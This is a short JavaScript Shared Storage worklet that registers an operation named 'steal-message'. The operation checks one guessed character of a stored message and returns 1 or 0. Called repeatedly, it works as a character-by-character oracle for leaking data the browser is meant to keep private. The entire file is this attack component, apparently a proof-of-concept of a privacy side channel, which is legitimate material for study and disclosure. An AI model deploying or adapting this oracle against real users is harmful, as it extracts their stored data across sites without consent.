class StealMessageOperation {
  async run(urls, data) {
    try {
      const { charPos, char2Check } = data;
      const message = await sharedStorage.get('message');
      return (message[charPos] === char2Check) ? 1 : 0;
    } catch (e) {
      console.log(e);
    }
  }
}

register('steal-message', StealMessageOperation);
